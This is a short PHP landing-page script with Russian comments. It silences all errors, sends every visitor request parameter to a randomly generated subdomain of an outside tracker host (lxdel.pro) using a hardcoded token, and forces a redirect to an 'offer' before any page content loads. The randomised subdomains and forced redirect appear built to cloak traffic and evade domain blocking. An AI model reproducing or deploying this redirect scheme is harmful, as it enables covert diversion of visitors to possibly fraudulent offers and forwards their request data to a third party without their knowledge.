<?php
// В начале файла
error_reporting(0); // Отключаем ВСЕ ошибки
ini_set('display_errors', 0);
ini_set('display_startup_errors', 0);
?>
<?php

require_once dirname(__FILE__) . '/kclient.php';

function generateRandomSubdomain($length = 8) {
    $characters = 'abcdefghijklmnopqrstuvwxyz0123456789'; 
    $subdomain = '';
    for ($i = 0; $i < $length; $i++) {
        $subdomain .= $characters[rand(0, strlen($characters) - 1)];
    }
    return $subdomain;
}

$randomSubdomain = generateRandomSubdomain();
$apiUrl = "https://{$randomSubdomain}.lxdel.pro/api.php";


$client = new KClient($apiUrl, 'P4nmwPwq1d1h5mJb');
$client->sendAllParams();
$client->forceRedirectOffer();
$client->executeAndBreak();

?><?php
include dirname(__FILE__) . '/config.php';
$companyName = $companyName[0]; 
$adr = $adr[0];
include dirname(__FILE__) . '/1.php';
?>